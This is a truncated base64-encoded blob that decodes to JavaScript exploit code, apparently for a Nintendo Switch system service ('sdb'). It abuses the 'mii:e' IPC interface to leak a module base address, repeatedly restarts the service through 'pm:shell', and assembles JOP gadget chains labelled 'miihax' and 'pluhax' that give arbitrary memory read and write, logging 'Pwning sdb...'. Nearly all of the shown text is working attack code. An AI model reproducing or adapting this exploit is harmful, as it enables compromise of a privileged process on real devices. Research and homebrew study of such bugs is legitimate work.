xyXG5cclxuXHR2YXIgdGVtcCA9IG5ldyBVaW50OEFycmF5KGF1dGhvcmlkLmxlbmd0aCArIHJldC5sZW5ndGgpO1xyXG5cdHRlbXAuc2V0KGF1dGhvcmlkKTtcclxuXHR0ZW1wLnNldChyZXQsIGF1dGhvcmlkLmxlbmd0aCk7XHJcblxyXG5cdHZhciBjcmMyID0gX2NyYyh0ZW1wLCB0ZW1wLmxlbmd0aCk7XHJcblx0cmV0W2IubGVuZ3RoKzJdID0gY3JjMiA+PiA4O1xyXG5cdHJldFtiLmxlbmd0aCszXSA9IGNyYzIgJiAweEZGO1xyXG5cclxuXHRyZXR1cm4gcmV0O1xyXG59XHJcblxyXG5mdW5jdGlvbiBBZGRPclJlcGxhY2UoaG5kLCBrZXksIHVubSwgYXV0aG9yaWQpXHJcbntcclxuXHR2YXIgY3JjYnVmID0gbmV3IFVpbnQ4QXJyYXkodW5tLmxlbmd0aCArIGtleS5sZW5ndGgpO1xyXG5cdGNyY2J1Zi5zZXQodW5tKTtcclxuXHRjcmNidWYuc2V0KGtleSwgdW5tLmxlbmd0aCk7XHJcblx0Y3JjYnVmID0gY3JjTWlpQnVmKGNyY2J1ZiwgYXV0aG9yaWQpO1xyXG5cclxuXHR2YXIgbmV3X21paSA9IG5ldyBVaW50OEFycmF5KGNyY2J1Zi5sZW5ndGggKyA0KTtcclxuXHRuZXdfbWlpLnNldChjcmNidWYpO1xyXG5cclxuXHR2YXIgbmV3X21paV9hc193b3JkcyA9IGM4dG8zMihuZXdfbWlpKTtcclxuXHJcblx0dmFyIGlwYyA9IHNjLmlwY01zZygxMyk7XHJcblx0aXBjLmRhdGF1MzIuYXBwbHkoaXBjLCBuZXdfbWlpX2FzX3dvcmRzKTtcclxuXHRpcGMuc2VuZFRvKGhuZCkuYXNzZXJ0T2soKTtcclxufVxyXG5cclxuZnVuY3Rpb24gTW92ZShobmQsIGtleSwgcG9zKVxyXG57XHJcblx0dmFyIGRhdGEgPSBuZXcgVWludDMyQXJyYXkoa2V5Lmxlbmd0aCAvIDQgKyAxKTtcclxuXHRkYXRhLnNldChjOHRvMzIoa2V5KSk7XHJcblx0ZGF0YVtkYXRhLmxlbmd0aCAtIDFdID0gcG9zO1xyXG5cdHZhciBpcGMgPSBzYy5pcGNNc2coMTIpO1xyXG5cdGlwYy5kYXRhdTMyLmFwcGx5KGlwYywgZGF0YSk7XHJcblx0aXBjLnNlbmRUbyhobmQpLmFzc2VydE9rKCk7XHJcbn1cclxuXHJcbmZ1bmN0aW9uIERlbGV0ZShobmQsIGtleSlcclxue1xyXG5cdHZhciBkYXRhID0gYzh0bzMyKGtleSk7XHJcblx0dmFyIGlwYyA9IHNjLmlwY01zZygxNCk7XHJcblx0aXBjLmRhdGF1MzIuYXBwbHkoaXBjLCBkYXRhKTtcclxuXHRpcGMuc2VuZFRvKGhuZCkuYXNzZXJ0T2soKTtcclxufVxyXG5cclxuZnVuY3Rpb24gR2V0Q291bnQoaG5kKVxyXG57XHJcblx0cmV0ID0gc2MuaXBjTXNnKDIpLmRhdGF1MzIoMSkuc2VuZFRvKGhuZCkuYXNzZXJ0T2soKS5kYXRhWzBdO1xyXG4vL1x0dXRpbHMubG9nKFwibWlpIGNvdW50IGlzIFwiICsgcmV0LnRvU3RyaW5nKCkpO1xyXG5cdHJldHVybiByZXQ7XHJcbn1cclxuXHJcbmZ1bmN0aW9uIEdldERlZmF1bHQoaG5kLCBvZmZzZXQpXHJcbntcclxuXHRyZXQgPSBzYy5pcGNNc2coNykuZGF0YXUzMihvZmZzZXQpLnNlbmRUbyhobmQpLmFzc2VydE9rKCk7XHJcblx0cmV0dXJuIHJldC5kYXRhO1xyXG59XHJcblxyXG5mdW5jdGlvbiBHZXRMb2FkQmFzZShobmQsIGF1dGhvcmlkKVxyXG57XHJcblx0dmFyIHVubSA9IG5ldyBVaW50OEFycmF5KFswLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAweDk3LCAweDAyLCAweDAwLCAweDAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAweDQxLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwXSk7XHJcblx0dmFyIGtleSA9IGM2NHRvOChbWzB4Y2FmZSwgMF0sIFsweGNhZmUwMDgwLCAwXV0pO1xyXG5cclxuXHRBZGRPclJlcGxhY2UoaG5kLCBrZXksIHVubSwgYXV0aG9yaWQpO1xyXG5cclxuXHR2YXIgZGF0YSA9IEdldERlZmF1bHQoaG5kLCAoMHgwMTBiNGIyMCArIDB4QyArIDB4NDQgKiAoR2V0Q291bnQoaG5kKSAtIDEpIC0gMHgwMTA3OTQzOCkgLyA0KTtcclxuXHJcblx0RGVsZXRlKGhuZCwga2V5KTtcclxuXHJcblx0cmV0dXJuIHV0aWxzLmFkZDIoW2RhdGFbNV0sIGRhdGFbNl1dLCAtMHg5YzU0MCk7XHJcbn1cclxuXHJcbmZ1bmN0aW9uIFdpcGUoaG5kKVxyXG57XHJcblx0dmFyIGJ1ZiA9IG5ldyBVaW50OEFycmF5KDEwMCoweDQ0KTtcclxuXHR2YXIgY291bnQgPSBzYy5pcGNNc2coOSkuZGF0YSgxKS5iRGVzY3JpcHRvcihidWYsIGJ1Zi5sZW5ndGgsIDApLnNlbmRUbyhobmQpLmFzc2VydE9rKCkuZGF0YVswXTtcclxuXHJcblx0aWYoIWNvdW50KVxyXG5cdFx0cmV0dXJuO1xyXG5cclxuXHR1dGlscy5sb2coXCJtaWkgY291bnQgdG8gZGVsZXRlIFwiICsgY291bnQudG9TdHJpbmcoKSk7XHJcblxyXG5cdHZhciBrZXkgPSBuZXcgVWludDhBcnJheSgxNik7XHJcblxyXG5cdGZvcihtaWkgPSAwOyBtaWkgPCBjb3VudDsgbWlpKyspXHJcblx0e1xyXG5cdFx0Zm9yKGogPSAwOyBqIDwgMTY7IGorKylcclxuXHRcdFx0a2V5W2pdID0gYnVmW2ogKyA0OCArIG1paSAqIDB4NDRdO1xyXG5cdFx0RGVsZXRlKGhuZCwga2V5KTtcclxuXHR9XHJcbn1cclxuXHJcblxyXG5mdW5jdGlvbiBnZXRTZXJ2aWNlUGlkKHNlcnZpY2UpXHJcbntcclxuXHR2YXIgcmVzID0gc2MuaXBjTXNnKDIpLnNldFR5cGUoMykuZGF0YXU2NCgwKS5zZW5kVG8oc2VydmljZSkuYXNzZXJ0T2soKTtcclxuXHRzYy5zdmNDbG9zZUhhbmRsZShyZXMubW92ZWRIYW5kbGVzWzBdKTtcclxuXHRyZXR1cm4gcmVzLnBpZFswXTtcclxufVxyXG5cclxuZnVuY3Rpb24gY2hlY2tNaWlDb2RlKGNvZGUpXHJcbntcclxuXHR2YXIgY2hlY2tlciA9IFswLDEsMiwzLDQsNSw2LDcsOCwxNiwxNywxOCwxOSwyMCwyMSwyMiwyMywyNCwzMiwzMywzNCwzNSwzNiwzNywzOCwzOSw0MCw0OCw0OSw1MCw1MSw1Miw1Myw1NCw1NSw1Niw2NCw2NSw2Niw2Nyw2OCw2OSw3MCw3MSw3Miw4MCw4MSw4Miw4Myw4NCw4NSw4Niw4Nyw4OCw5Niw5Nyw5OCw5OSwxMDAsMTAxLDEwMiwxMDMsMTA0LDExMiwxMTMsMTE0LDExNSwxMTYsMTE3LDExOCwxMTksMTIwLDEyOCwxMjksMTMwLDEzMSwxMzIsMTMzLDEzNCwxMzUsMTM2XTtcclxuXHRyZXR1cm4gY2hlY2tlci5pbmRleE9mKGNvZGUpID49IDA7XHJcbn1cclxuXHJcbnZhciBzZGJjb3JlID0gZnVuY3Rpb24oc2MsIHZlcnMpIHtcclxuXHRpZiAoIXNkYmNvcmUucHJvdG90eXBlLmltcG9ydGVkTWl4aW5zKSB7XHJcblx0XHRPYmplY3Qua2V5cyhzdmNNaXhpbikuZm9yRWFjaCgoaykgPT4ge1xyXG5cdFx0XHRzZGJjb3JlLnByb3RvdHlwZVtrXSA9IHN2Y01peGluW2tdO1xyXG5cdFx0fSk7XHJcblxyXG5cdFx0T2JqZWN0LmtleXMoc3Bsb2l0TWl4aW4pLmZvckVhY2goKGspID0+IHtcclxuXHRcdFx0c2RiY29yZS5wcm90b3R5cGVba10gPSBzcGxvaXRNaXhpbltrXTtcclxuXHRcdH0pO1xyXG5cclxuXHRcdHNkYmNvcmUucHJvdG90eXBlLmltcG9ydGVkTWl4aW5zID0gdHJ1ZTtcclxuXHR9XHJcblxyXG5cdHV0aWxzLmxvZygnU3RhcnRpbmcgc2RiY29yZS4uLicpO1xyXG5cdHRoaXMuc2MgPSBzYztcclxuXHR3aW5kb3cuc2MgPSBzYztcclxuXHR0aGlzLmluaXRpYWxpemVkID0gZmFsc2U7XHJcblx0dGhpcy52ZXJzID0gdmVycztcclxuXHR0aGlzLm9mZnNldHMgPSB0aGlzLmdldF9vZmZzZXRzKCk7XHJcblx0aWYgKHRoaXMub2Zmc2V0cyA9PSBudWxsKSB7XHJcblx0XHR1dGlscy5sb2coJ1Vua25vd24gdmVyc2lvbjogJyt2ZXJzKTtcclxuXHRcdHJldHVybjtcclxuXHR9XHJcblx0dGhpcy5zdmNzID0gdGhpcy5vZmZzZXRzWydzdmNfZGljJ107XHJcblxyXG5cdHRoaXMuc3Bsb2l0TWl4aW5Jbml0KCk7XHJcblxyXG5cdHV0aWxzLmxvZygnUHduaW5nIHNkYi4uLicpO1xyXG5cdHRoaXMuaW5pdGlhbGl6ZSh0aGlzLnNjKTtcclxuXHR1dGlscy5sb2coJ1B3bmVkIHNkYi4uLicpO1xyXG59O1xyXG5cclxuc2RiY29yZS5wcm90b3R5cGUubmFtZSA9IFwic2RiXCI7XHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS5xdWVyeU1lbSA9IGZ1bmN0aW9uKGFkZHIsIHJhdykge1xyXG5cdGlmKGFyZ3VtZW50cy5sZW5ndGggPT0gMSlcclxuXHRcdHJhdyA9IGZhbHNlO1xyXG5cclxuXHR2YXIgbWVtaW5mbyA9IHV0aWxzLmFkZDIodGhpcy5yb3BCYXNlLCAweDQwMDAwKTtcclxuXHR2YXIgcGFnZWluZm8gPSB1dGlscy5hZGQyKHRoaXMucm9wQmFzZSwgMHg0MDAyOCk7XHJcblxyXG5cdHZhciBtZW1wZXJtcyA9IFsnTk9ORScsICdSJywgJ1cnLCAnUlcnLCAnWCcsICdSWCcsICdXWCcsICdSV1gnXTtcclxuXHR2YXIgbWVtc3RhdGVzID0gWydOT05FJywgJygxKScsICcoMiknLCAnQ09ERS1TVEFUSUMnLCAnQ09ERScsICdIRUFQJywgJ1NIQVJFRC1NRU0tQkxPQ0snLCAnTU9EVUxFLUNPREUtU1RBVElDJywgJ01PRFVMRS1DT0RFJywgJ1NUQUNLLU1JUlJPUicsICdUSFJFQUQtTE9DQUwtU1RPUkFHRScsICdNRU1PUllfTUlSUk9SJywgJygxNSknLCAnUkVTRVJWRUQnXTtcclxuXHR0aGlzLnN2YygweDYsIFttZW1pbmZvLCBwYWdlaW5mbywgYWRkcl0pO1xyXG5cclxuXHR2YXIgbXMgPSB0aGlzLnJ3LnJlYWQodXRpbHMuYWRkMihtZW1pbmZvLCAweDEwKSk7XHJcblx0bXMgPSAgdXRpbHMucGFkZHIobXMpO1xyXG5cdC8qaWYoIXJhdyAmJiBtc1sxXSA9PSAwICYmIG1zWzBdIDwgbWVtc3RhdGVzLmxlbmd0aClcclxuICAgIG1zID0gbWVtc3RhdGVzW21zWzBdXTtcclxuICAgIGVsc2UgaWYoIXJhdylcclxuICAgIG1zID0gJ1VOS05PV04nKi9cclxuXHR2YXIgbXAgPSB0aGlzLnJ3LnJlYWQodXRpbHMuYWRkMihtZW1pbmZvLCAweDE4KSk7XHJcblx0aWYoIXJhdyAmJiBtcFsxXSA9PSAwICYmIG1wWzBdIDwgbWVtcGVybXMubGVuZ3RoKVxyXG5cdFx0bXAgPSBtZW1wZXJtc1ttcFswXV07XHJcblxyXG5cdHZhciBkYXRhID0gW3RoaXMucncucmVhZChtZW1pbmZvKSwgdGhpcy5ydy5yZWFkKHV0aWxzLmFkZDIobWVtaW5mbywgOCkpLCBtcywgbXAsIHRoaXMucncucmVhZChwYWdlaW5mbyldO1xyXG5cclxuXHRyZXR1cm4gZGF0YTtcclxufTtcclxuXHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS5zdmMgPSBmdW5jdGlvbihpZCwgcmVnaXN0ZXJzLCBkdW1wX3JlZ3MpIHtcclxuXHRpZiAoYXJndW1lbnRzLmxlbmd0aCA9PSAyKVxyXG5cdFx0ZHVtcF9yZWdzID0gZmFsc2U7XHJcblx0aWYgKCEoaWQgaW4gdGhpcy5zdmNzKSkge1xyXG5cdFx0dXRpbHMubG9nKCdFcnJvcjogc2RiIGRvZXMgbm90IGNvbnRhaW4gc3ZjIDB4JytpZC50b1N0cmluZygxNikpO1xyXG5cdFx0cmV0dXJuIG51bGw7XHJcblx0fVxyXG5cdHJldHVybiB0aGlzLnNsb3dDYWxsKHRoaXMuc3Zjc1tpZF0sIHJlZ2lzdGVycywgW10sIGR1bXBfcmVncyk7XHJcbn07XHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS5yZXNldE1vZHVsZSA9IGZ1bmN0aW9uKCkge1xyXG5cdC8vIHdpcGUgYWxsIG1paXNcclxuXHR0aGlzLmhhbmRsZSA9IHNjLmlwY01zZygwKS5kYXRhKDB4QTUyM0I3OEYpLnNlbmRUbygnbWlpOmUnKS5hc3NlcnRPaygpLm1vdmVkSGFuZGxlc1swXTtcclxuXHR1dGlscy5sb2coXCJtaWkgaGFuZGxlIGlzIDB4XCIgKyB0aGlzLmhhbmRsZS50b1N0cmluZygxNikpO1xyXG5cdHV0aWxzLmxvZyhcIndpcGUgbWlpcyAuLi5cIik7XHJcblx0V2lwZSh0aGlzLmhhbmRsZSk7XHJcblxyXG5cdHZhciByZXNldGNvdW50ID0gMDtcclxuXHR2YXIgc2RiUGlkID0gZ2V0U2VydmljZVBpZCh0aGlzLmhhbmRsZSk7XHJcblx0dmFyIHRpZCA9IHV0aWxzLnBhcnNlQWRkcignMDEwMDAwMDAwMDAwMDAzOScpO1xyXG5cclxuXHR1dGlscy5sb2coXCJyZWxvYWRpbmcgc2RiLCB0aGlzIG1pZ2h0IHRha2UgYSB3aGlsZSAuLi5cIik7XHJcblxyXG5cdHdoaWxlKDEpXHJcblx0e1xyXG5cdFx0c2Muc3ZjQ2xvc2VIYW5kbGUodGhpcy5oYW5kbGUpO1xyXG5cdFx0c2Mua2lsbEF1dG9IYW5kbGUoKTtcclxuXHJcblx0XHQvLyByZXN0YXJ0IHNkYlxyXG5cdFx0c2MuaXBjTXNnKDEpLmRhdGEoc2RiUGlkKS5zZW5kVG8oJ3BtOnNoZWxsJykuYXNzZXJ0T2soKTtcclxuXHRcdHNkYlBpZCA9IHRoaXMuc2MuaXBjTXNnKDApLmRhdGF1NjQoMCwgdGlkLCAzKS5zZW5kVG8oJ3BtOnNoZWxsJykuZGF0YVswXTtcclxuXHRcdHV0aWxzLmxvZyhcIm5ldyBzZGIgcGlkOiAweFwiICsgc2RiUGlkLnRvU3RyaW5nKDE2KSk7XHJcblxyXG5cdFx0dGhpcy5oYW5kbGUgPSBzYy5pcGNNc2coMCkuZGF0YSgweEE1MjNCNzhGKS5zZW5kVG8oJ21paTplJykuYXNzZXJ0T2soKS5tb3ZlZEhhbmRsZXNbMF07XHJcblxyXG5cdFx0dGhpcy5zZGJfYmFzZSA9IEdldExvYWRCYXNlKHRoaXMuaGFuZGxlLCB0aGlzLmF1dGhvcmlkKTtcclxuXHQvL1x0dXRpbHMubG9nKFwidGhpcy5zZGJfYmFzZSBhdCBcIiArIHV0aWxzLnBhZGRyKHRoaXMuc2RiX2Jhc2UpKTtcclxuXHJcblx0XHRpZihjaGVja01paUNvZGUodGhpcy5zZGJfYmFzZVswXSA+Pj4gMjQpICYmIGNoZWNrTWlpQ29kZSgodGhpcy5zZGJfYmFzZVswXSA+Pj4gMTYpICYgMHhGRikgJiYgdGhpcy5zZGJfYmFzZVsxXSA+IDApXHJcblx0XHR7XHJcblx0XHRcdHV0aWxzLmxvZyhcInNkYiBwaWQgaXMgMHhcIiArIHNkYlBpZC50b1N0cmluZygxNikgKyBcIiB0aGlzLnNkYl9iYXNlIGF0IFwiICsgdXRpbHMucGFkZHIodGhpcy5zZGJfYmFzZSkpO1xyXG5cdFx0XHR1dGlscy5sb2coXCIqKiBnb29kIGJhc2UgKioqXCIpO1xyXG5cdFx0XHRicmVhaztcclxuXHRcdH1cclxuXHRcdHJlc2V0Y291bnQrKztcclxuXHR9XHJcbn07XHJcblxyXG5mdW5jdGlvbiBhZGQ2NChidWYsIG9mZnMsIGRhdGEpXHJcbntcclxuXHRidWZbb2ZmcysrXSA9IGRhdGFbMF0gJiAweEZGO1xyXG5cdGJ1ZltvZmZzKytdID0gKGRhdGFbMF0gPj4+IDgpICYgMHhGRjtcclxuXHRidWZbb2ZmcysrXSA9IChkYXRhWzBdID4+PiAxNikgJiAweEZGO1xyXG5cdGJ1ZltvZmZzKytdID0gKGRhdGFbMF0gPj4+IDI0KSAmIDB4RkY7XHJcblx0YnVmW29mZnMrK10gPSBkYXRhWzFdICYgMHhGRjtcclxuXHRidWZbb2ZmcysrXSA9IChkYXRhWzFdID4+PiA4KSAmIDB4RkY7XHJcblx0YnVmW29mZnMrK10gPSAoZGF0YVsxXSA+Pj4gMTYpICYgMHhGRjtcclxuXHRidWZbb2ZmcysrXSA9IChkYXRhWzFdID4+PiAyNCkgJiAweEZGO1xyXG59XHJcblxyXG5zZGJjb3JlLnByb3RvdHlwZS5zZXR1cEJ1ZmZlcnMgPSBmdW5jdGlvbigpIHtcclxuXHR0aGlzLnNjcmF0Y2ggPSB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MTRFRDAwKTtcclxuXHRcclxuXHR0aGlzLnBkbV9iYXNlID0gdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDE1MGVjMCk7XHJcblx0dXRpbHMubG9nKFwidGhpcy5wZG1fYmFzZSBhdCBcIiArIHV0aWxzLnBhZGRyKHRoaXMucGRtX2Jhc2UpKTtcclxuXHJcblx0dmFyIHJldHVybkFkZHIgPSB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MmZjNTgpO1xyXG5cclxuXHQvLyByZXdyaXRlIHBsOnUgY21kMVxyXG5cdHZhciB3cml0ZUFkZHIgPSB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4OTlBOTgpO1xyXG5cdHZhciB3cml0ZVZhbHVlID0gdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAxN2Q4MCk7IC8vIGdhZGdldCAwXHJcblxyXG5cdHZhciBidWYgPSBuZXcgVWludDhBcnJheSgweDcwMCk7XHJcblxyXG5cdC8vLyBKT1AgY2hhaW5zXHJcblx0Ly8gbm90aWNlIGhvdyBuaWNlbHkgYXJlIHRoZXNlIHZhbHVlcyBjb21wYWN0ZWRcclxuXHJcblx0Ly8gbWlpaGF4IGFyYi53cml0ZVxyXG5cdGFkZDY0KGJ1ZiwgMHgwMDAwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MDAyMCkpOyAvLyBBXHJcblx0YWRkNjQoYnVmLCAweDAwMDgsIHdyaXRlQWRkcik7XHJcblx0YWRkNjQoYnVmLCAweDAwMTAsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgyZDE3MCkpOyAvLyAqQlxyXG5cdGFkZDY0KGJ1ZiwgMHgwMDE4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4Njc0MCkpO1xyXG5cdGFkZDY0KGJ1ZiwgMHgwMDIwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MDAxMCkpOyAvLyAqQTsgQlxyXG5cdGFkZDY0KGJ1ZiwgMHgwMDI4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4NzE2MCkpOyAvLyAqRFxyXG5cdGFkZDY0KGJ1ZiwgMHgwMDMwLCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4NTM0MzApKTsgLy8gKkEgKyAweDEwXHJcblx0YWRkNjQoYnVmLCAweDAwMzgsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgwMDQwKSk7IC8vICpBICsgMHgxODsgQ1xyXG5cdGFkZDY0KGJ1ZiwgMHgwMDQwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MDAyOCkpOyAvLyAqQzsgRFxyXG5cdGFkZDY0KGJ1ZiwgMHgwMDQ4LCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MDA2MCkpOyAvLyAqRTsgRlxyXG5cdGFkZDY0KGJ1ZiwgMHgwMDUwLCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MmYwOTApKTsgLy8gKkQgKyAweDI4XHJcblx0YWRkNjQoYnVmLCAweDAwNTgsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgwMDQ4KSk7IC8vICpDICsgMHgxODsgRVxyXG5cdGFkZDY0KGJ1ZiwgMHgwMDYwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MDA2MCkpOyAvLyAqRjsgR1xyXG5cdGFkZDY0KGJ1ZiwgMHgwMDY4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4NzE2MCkpOyAvLyAqRyArIDB4MDhcclxuXHRhZGQ2NChidWYsIDB4MDA3MCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDcxNjApKTsgLy8gKkIgKyAweDYwXHJcblx0YWRkNjQoYnVmLCAweDAwNzgsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgwMDgwKSk7IC8vICpGICsgMHgxODsgSFxyXG5cdGFkZDY0KGJ1ZiwgMHgwMDgwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MDA5OCkpOyAvLyAqSDsgSVxyXG5cdGFkZDY0KGJ1ZiwgMHgwMDg4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MmQ1ZjgpKTsgLy8gKkYgKyAweDI4XHJcblx0YWRkNjQoYnVmLCAweDAwOTAsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHg0N2NjOCkpOyAvLyAqRiArIDB4MzBcclxuXHRhZGQ2NChidWYsIDB4MDA5OCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDcyMTgpKTsgLy8gKkcgKyAweDM4XHJcblx0YWRkNjQoYnVmLCAweDAwYTAsIHJldHVybkFkZHIpOyAvLyAqSSArIDB4MDhcclxuXHRhZGQ2NChidWYsIDB4MDBhOCwgd3JpdGVWYWx1ZSk7IC8vICpJICsgMHgxMCBcclxuXHQvLyBub3RlOiBiMCAtIGI4IHVzZWRcclxuXHRhZGQ2NChidWYsIDB4MDBjMCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDJkNWY4KSk7IC8vICpJICsgMHgyOFxyXG5cdGFkZDY0KGJ1ZiwgMHgwMGM4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4NGI0NmMpKTsgLy8gKkkgKyAweDMwXHJcblx0Ly8gcGx1aGF4IGFyYi5yZWFkIGFuZCBhcmIud3JpdGU7IGJvdGggc2hhcmUgJ2ZpcnN0IHN0YWdlJ1xyXG5cdGFkZDY0KGJ1ZiwgMHgwMGIwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MGMwKSk7IC8vIEFcclxuXHRhZGQ2NChidWYsIDB4MDBiOCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDBkOCkpOyAvLyBCXHJcblx0Ly8gbm90ZTogYzAgLSBjOCB1c2VkXHJcblx0YWRkNjQoYnVmLCAweDAwZDAsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwMDI2Y2MpKTsgLy8gKkEgKyAxNjsgZ2F0Z2V0IDRcclxuXHRhZGQ2NChidWYsIDB4MDBkOCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDExMCkpOyAvLyAqQjsgQ1xyXG5cdGFkZDY0KGJ1ZiwgMHgwMGUwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MTQ4KSk7IC8vICpFOyBGXHJcblx0YWRkNjQoYnVmLCAweDAwZTgsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgxMjApKTsgLy8gKkUgKyA4OyBHXHJcblx0YWRkNjQoYnVmLCAweDAwZjAsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwMDMzZDApKTsgLy8gKkEgKyA0ODsgZ2F0Z2V0IDNcclxuXHRhZGQ2NChidWYsIDB4MDBmOCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAxMzQ5YykpOyAvLyAqQiArIDMyOyBnYXRnZXQgMTBcclxuXHRhZGQ2NChidWYsIDB4MDEwMCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDBlMCkpOyAvLyAqRCArIDg7IEVcclxuXHRhZGQ2NChidWYsIDB4MDEwOCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAyNWQwOCkpOyAvLyAqQiArIDQ4OyBnYXRnZXQgNlxyXG5cdGFkZDY0KGJ1ZiwgMHgwMTEwLCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDRkZTljKSk7IC8vICpDOyBnYXRnZXQgNVxyXG5cdGFkZDY0KGJ1ZiwgMHgwMTE4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDE0MTM0KSk7IC8vICpDICsgODsgZ2F0Z2V0IDdcclxuXHRhZGQ2NChidWYsIDB4MDEyMCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDE1OCkpOyAvLyAqRzsgSFxyXG5cdGFkZDY0KGJ1ZiwgMHgwMTI4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDJkNmM4KSk7IC8vICpDICsgMjQ7IGdhdGdldCA4XHJcblx0YWRkNjQoYnVmLCAweDAxMzAsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgxNjgpKTsgLy8gWlxyXG5cdGFkZDY0KGJ1ZiwgMHgwMTM4LCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MGY4KSk7IC8vICpCICsgOTY7IERcclxuXHRhZGQ2NChidWYsIDB4MDE0MCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAwNjM4YykpOyAvLyAqQiArIDEwNDsgZ2F0Z2V0IDExXHJcblx0YWRkNjQoYnVmLCAweDAxNDgsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwNGRiZjgpKTsgLy8gKkY7IGdhdGdldCAxMlxyXG5cdGFkZDY0KGJ1ZiwgMHgwMTUwLCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDJkZTBjKSk7IC8vICpGICsgODsgZ2F0Z2V0MTR3XHJcblx0YWRkNjQoYnVmLCAweDAxNTgsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwMjBDODQpKTsgLy8gKkc7IHJldHVyblc7ICpWICsgNDA7IHJldHVyblJcclxuXHRhZGQ2NChidWYsIDB4MDE2MCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDAwMjg1MCkpOyAvLyAqRyArIDg7IGdhdGdldDE2d1xyXG5cdGFkZDY0KGJ1ZiwgMHgwMTY4LCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MTcwKSk7IC8vICpaOyBZXHJcblx0YWRkNjQoYnVmLCAweDAxNzAsIHV0aWxzLmFkZDIodGhpcy5wZG1fYmFzZSwgMHgxYTgpKTsgLy8gKlg7IFdcclxuXHRhZGQ2NChidWYsIDB4MDE3OCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDE4MCkpOyAvLyAqWCArIDg7IFVcclxuXHRhZGQ2NChidWYsIDB4MDE4MCwgdXRpbHMuYWRkMih0aGlzLnBkbV9iYXNlLCAweDFiOCkpOyAvLyAqVTsgVFxyXG5cdGFkZDY0KGJ1ZiwgMHgwMTg4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDA3MWUwKSk7IC8vICpGICsgNjQ7IGdhdGdldDE1d1xyXG5cdGFkZDY0KGJ1ZiwgMHgwMTkwLCB1dGlscy5hZGQyKHRoaXMucGRtX2Jhc2UsIDB4MTMwKSk7IC8vICpYICsgMzI7IFZcclxuXHRhZGQ2NChidWYsIDB4MDE5OCwgdXRpbHMuYWRkMih0aGlzLnNkYl9iYXNlLCAweDA0ZGJmOCkpOyAvLyAqWSArIDQwOyBnYXRnZXQgMTVyXHJcblx0YWRkNjQoYnVmLCAweDAxYTAsIHV0aWxzLmFkZDIodGhpcy5zZGJfYmFzZSwgMHgwMDI4NTApKTsgLy8gKlggKyA0ODsgZ2F0Z2V0IDE2clxyXG5cdGFkZDY0KGJ1ZiwgMHgwMWE4LCB1dGlscy5hZGQyKHRoaXMuc2RiX2Jhc2UsIDB4MDJkZDVjKSk7IC8vICpXOyBnYXRnZXQgMTRyXHJcblx0YWRk